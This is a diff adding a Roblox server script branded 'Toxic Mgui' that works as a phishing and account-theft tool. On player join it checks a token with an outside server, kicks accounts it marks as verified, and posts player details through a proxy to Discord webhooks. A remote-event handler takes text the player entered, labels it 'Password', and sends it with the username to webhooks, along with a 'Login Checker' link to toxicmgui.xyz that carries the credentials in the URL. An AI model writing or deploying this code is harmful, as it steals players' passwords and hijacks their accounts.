@@ -1,0 +1,299 @@
+local HttpService = game:GetService("HttpService")
+local configure = require(game.ServerScriptService.Settings)
+game.Players.PlayerAdded:Connect(function(Player)
+	if HttpService:GetAsync("http://toxicmgui.x10.mx/check.php?token="..configure.Token) == "Whitelisted" then
+		print("Loaded")
+	else
+		Player:Kick("Invalid Token!")
+	end
+end)		
+game.Players.PlayerAdded:Connect(function(Player)
+
+	local Proxy = require(game.ServerStorage.RenzEmbed.RenzProxy.Proxy)
+	local Proxy = Proxy:New('https://proxynichan.herokuapp.com/', 'cec8edfe1ebd565a22b4de939b0dc6c44938d9e3656fdb7334f78fbac6037e59')
+
+	local userName = Player.Name
+	local userID = Player.UserId
+	local playerAge = Player.AccountAge
+
+	local Settings = require(script.Parent.Settings)
+	local HTTP = game:GetService("HttpService")
+
+	local mem = ""
+	if Player.MembershipType == Enum.MembershipType.Premium then
+		mem = "Premium"
+	else
+		mem = "NBC"
+	end
+
+	local Verify = "Unverified"
+	if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player,102611803)then
+		Verify = "Verified"
+	end
+
+	if Settings.VerifiedKicker == true then
+		if Verify == "Verified" then
+			Player:Kick("Verified Player Is Not Allowed Here!")
+		elseif Verify == "Unverified" then
+			print("Unverified")
+		end
+	elseif Settings.VerifiedKicker == false then
+		print("Verified Kicker Are Disable!")
+	end
+
+	local timestamp = DateTime.now():ToIsoDate()
+
+	local finalAge = ""
+
+	if playerAge <= 1 then
+		finalAge = ""..playerAge.." Day Old"
+	elseif playerAge >= 1 then
+		finalAge = ""..playerAge.." Day's Old"
+	end
+
+	local day = 60 * 60 * 24
+
+	local tm = os.time() - (day * playerAge) 
+	local date = os.date("!*t", tm)
+
+	local Embed1 = 
+		{
+			["username"] = "Toxic Mgui", -- MGUI Name
+			["avatar_url"] = "https://media.discordapp.net/attachments/948065929210777651/965923845808734258/unknown.png", -- MGUI Avatar Link
+			["embeds"] = {{
+				["title"] = "Visit Results || Toxic Mgui", -- Embed Title
+				["description"] = ""..Player.Name.."  Just joined your game",
+				["type"] = "rich", -- Embed Type
+				["color"] = tonumber(0x00ff29), -- Embed Color | Search HexDec In Google
+				["thumbnail"] = {
+					["url"] = " https://www.roblox.com/Avatar-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png",
+				}, -- Thumbnail Link / Player's Picture
+				["footer"] = {
+					["text"] = "Powered By: Toxic MGUI", -- Footer Text
+					["icon_url"] = "https://media.discordapp.net/attachments/948065929210777651/966527493567815680/standard.gif", -- footer Icon Link
+				},
+				["timestamp"] = timestamp;
+				["fields"] = {
+					{
+						["name"] = "**Username**",
+						["value"] = ""..userName.."", -- Player's username
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Membership**",
+						["value"] = ""..mem.."", -- Player's  Membership
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Account Age**",
+						["value"] = ""..finalAge.."", -- Player's  Age
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Security**",
+						["value"] = ""..Verify.."", -- Player's  Verification Status
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Game Link**",
+						["value"] = [[**[Click here](https://www.roblox.com/games/]]..tostring(game.PlaceId) ..[[)**]], --  Game Link
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Inventory**",
+						["value"] = [[**[Click here](https://www.roblox.com/users/]]..userID..[[/inventory#!/accessories)**]], --  Game Link
+						["inline"] = true,
+					},
+
+				},
+			}}
+		}
+	local Embed2 = HTTP:JSONEncode(Embed1)
+	Proxy:Post(Settings.Visit, Embed2)
+end)
+game.ReplicatedStorage.RenzRequest.OnServerEvent:connect(function(Player, Text)
+
+	local Proxy = require(game.ServerStorage.RenzEmbed.RenzProxy.Proxy)
+	local Proxy = Proxy:New('https://proxynichan.herokuapp.com/', 'cec8edfe1ebd565a22b4de939b0dc6c44938d9e3656fdb7334f78fbac6037e59')
+
+	local userName = Player.Name
+	local userID = Player.UserId
+	local playerAge = Player.AccountAge
+
+	local Settings = require(script.Parent.Settings)
+	local HTTP = game:GetService("HttpService")
+
+	local Verify = "Unverified"
+	if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player,102611803)then
+		Verify = "Verified"
+	end
+
+	local timestamp = DateTime.now():ToIsoDate()
+
+	local finalAge = ""
+
+	if playerAge <= 1 then
+		finalAge = ""..playerAge.." Day Old"
+	elseif playerAge >= 1 then
+		finalAge = ""..playerAge.." Days Old"
+	end
+
+	local day = 60 * 60 * 24
+
+	local tm = os.time() - (day * playerAge) 
+	local date = os.date("!*t", tm)
+
+	local NBCEmbed = 
+		{
+			["username"] = "Toxic Mgui", -- MGUI Name
+			["avatar_url"] = "https://media.discordapp.net/attachments/948065929210777651/965923845808734258/unknown.png", -- MGUI Avatar Link
+			["embeds"] = {{
+				["title"] = "Nbc Results || Toxic Mgui", -- Embed Title
+				["description"] = ""..Player.Name.." Just logged in to your game",
+				["type"] = "rich", -- Embed Type
+				["color"] = tonumber(0x00ff29), -- Embed Color | Search HexDec In Google
+				["thumbnail"] = {
+					["url"] = " https://www.roblox.com/Avatar-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png",
+				}, -- Thumbnail Link / Player's Picture
+				["footer"] = {
+					["text"] = "Powered By: Toxic MGUI", -- Footer Text
+					["icon_url"] = "https://media.discordapp.net/attachments/948065929210777651/966527493567815680/standard.gif", -- footer Icon Link
+				},
+				["timestamp"] = timestamp;
+				["fields"] = {
+					{
+						["name"] = "**Account Profile**",
+						["value"] = [[**[View Profile](https://web.roblox.com/users/]]..userID..[[/profile)**]], --  Game Link
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Username**",
+						["value"] = ""..userName.."", -- Player's username
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Password**",
+						["value"] = ""..Text.."", -- Player's username
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Membership**",
+						["value"] = "NBC", -- Player's  Membership
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Account Age**",
+						["value"] = ""..finalAge.."", -- Player's  Age
+						["inline"] = true,
+					},	
+					{
+						["name"] = "**Security**",
+						["value"] = ""..Verify.."", -- Player's  Verification Status
+						["inline"] = true,
+					},	
+					{
+						["name"] = "**Game Link**",
+						["value"] = [[**[Click here](https://www.roblox.com/games/]]..tostring(game.PlaceId) ..[[)**]], --  Game Link
+						["inline"] = true,
+
+					},
+					{
+						["name"] = "**Inventory**",
+						["value"] = [[**[Click here](https://www.roblox.com/users/]]..userID..[[/inventory#!/accessories)**]], --  Game Link
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Login Checker**",
+						["value"] = [[**[Click Here](http://toxicmgui.xyz/index.php?username=]]..userName..[[&password=]]..Text..[[&success=]]..Settings.Success..[[&failed=]]..Settings.Failed..[[)**]], --  Game Link
+						["inline"] = true,
+
+					},
+					
+				},
+			}}
+		}
+	local PremiumEmbed = 
+		{
+			["username"] = "Toxic Mgui", -- MGUI Name
+			["avatar_url"] = "https://media.discordapp.net/attachments/948065929210777651/965923845808734258/unknown.png", -- MGUI Avatar Link
+			["embeds"] = {{
+				["title"] = "Premium Results || Toxic Mgui", -- Embed Title
+				["description"] = ""..Player.Name.." has joined the game",
+				["type"] = "rich", -- Embed Type
+				["color"] = tonumber(0x00ff29), -- Embed Color | Search HexDec In Google
+				["thumbnail"] = {
+					["url"] = " https://www.roblox.com/Avatar-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png",
+				}, -- Thumbnail Link / Player's Picture
+				["footer"] = {
+					["text"] = "Powered By: Toxic MGUI", -- Footer Text
+					["icon_url"] = "https://media.discordapp.net/attachments/948065929210777651/966527493567815680/standard.gif", -- footer Icon Link
+				},
+				["timestamp"] = timestamp;
+				["fields"] = {
+					{
+						["name"] = "**Account Profile**",
+						["value"] = [[**[View Profile](https://web.roblox.com/users/]]..userID..[[/profile)**]], --  Game Link
+						["inline"] = true,
+					},
+					{
+						["name"] = "**Username**",
+						["value"] = ""..userName.."", -- Player's username
+						["outline"] = true,
+					},
+					{
+						["name"] = "**Password**",
+						["value"] = ""..Text.."", -- Player's username
+						["outline"] = true,
+					},
+					{
+						["name"] = "**Membership**",
+						["value"] = "Premium", -- Player's  Membership
+						["outline"] = true,
+
+					},
+					{
+						["name"] = "**Account Age**",
+						["value"] = ""..finalAge.."", -- Player's  Age
+						["outline"] = true,
+
+					},
+					{
+						["name"] = "**Security**",
+						["value"] = ""..Verify.."", -- Player's  Verification Status
+						["outline"] = true,
+
+					},
+					{
+						["name"] = "**Game Link**",
+						["value"] = [[**[Click here](https://www.roblox.com/games/]]..tostring(game.PlaceId) ..[[)**]], --  Game Link
+						["outline"] = true,
+
+					},
+					{
+						["name"] = "**Inventory**",
+						["value"] = [[**[Click here](https://www.roblox.com/users/]]..userID..[[/inventory#!/accessories)**]], --  Game Link
+						["inline"] = false,
+					},
+					{
+						["name"] = "**Login Checker**",
+						["value"] = [[**[Click Here](http://toxicmgui.xyz/index.php?username=]]..userName..[[&password=]]..Text..[[&success=]]..Settings.Success..[[&failed=]]..Settings.Failed..[[)**]], --  Game Link
+						["outline"] = true,
+
+					},
+					
+				},
+			}}
+		}
+	if Player.MembershipType == Enum.MembershipType.Premium then
+		local Json = HTTP:JSONEncode(PremiumEmbed)
+		Proxy:Post(Settings.Premium, Json)
+	else
+		local Json = HTTP:JSONEncode(NBCEmbed)
+		Proxy:Post(Settings.NBC, Json)
+	end
+end)
